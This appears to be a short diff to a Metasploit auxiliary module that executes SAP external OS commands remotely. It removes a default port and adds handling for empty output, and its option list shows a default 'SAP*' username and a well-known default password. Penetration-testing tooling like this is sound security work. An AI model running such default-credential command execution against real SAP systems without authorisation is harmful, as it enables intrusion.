@@ -35,7 +35,6 @@ class Metasploit4 < Msf::Auxiliary
 
     register_options(
     [
-      Opt::RPORT(3342),
       OptString.new('USERNAME', [true, 'Username', 'SAP*']),
       OptString.new('PASSWORD', [true, 'Password', '06071992']),
       OptString.new('CMD', [true, 'Command Name as in SM69', 'CAT']),
@@ -51,7 +50,11 @@ class Metasploit4 < Msf::Auxiliary
     end
 
     res = exec_CMD(user,datastore['CLIENT'],pass,rhost,datastore['RPORT'], datastore['CMD'], datastore['PARAM'])
-    print res if res
+    if res.blank?
+      print_error("#{rhost}:#{rport} [SAP] No output returned")
+    else
+      print res
+    end
   end
 
   def exec_CMD(user, client, password, rhost, rport, cmd, param)
